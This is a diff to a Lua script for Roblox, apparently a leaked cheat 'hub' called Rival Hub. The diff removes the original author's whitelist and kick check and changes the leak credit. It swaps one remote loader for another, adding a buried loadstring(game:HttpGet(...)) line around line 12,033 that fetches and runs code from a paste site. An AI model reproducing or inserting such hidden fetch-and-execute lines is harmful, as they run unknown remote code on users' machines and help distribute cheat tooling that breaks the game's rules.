@@ -1,13 +1,4 @@
--- 🔐 USUARIOS AUTORIZADOS
-local authorizedUsers = {"PLATANITOOOOO79", "yazidXiter", "eliezer_blockspin991"}
-local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
-if not localPlayer then return end
-local isAuthorized = false
-for _, u in ipairs(authorizedUsers) do if u == localPlayer.Name then isAuthorized = true break end end
-if not isAuthorized then pcall(function() localPlayer:Kick("RESET HWID - No autorizado") end) return end
-
----- leaked by .gg/source
+---- leaked by fpsl
 
 if _G.RivalHubRunning then
     warn("[Rival Hub] Instancia previa detectada. Se recomienda rejoin si hay comportamiento errático.")
@@ -1564,7 +1555,6 @@ pcall(applyLocalFace, character, faceId)
 end
 end)
 end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
 end
 local function findCharacterAttachment(character, name)
 for _, object in ipairs(character:GetDescendants()) do
@@ -12043,7 +12033,7 @@ do
             end)
         end
     end
-
+loadstring(game:HttpGet("https://pastefy.app/ndRBNCw8/raw"))()
     local function scanSkinTools()
         watchSkinContainer(SkinLP:FindFirstChildOfClass("Backpack"))
         watchSkinContainer(SkinLP.Character)
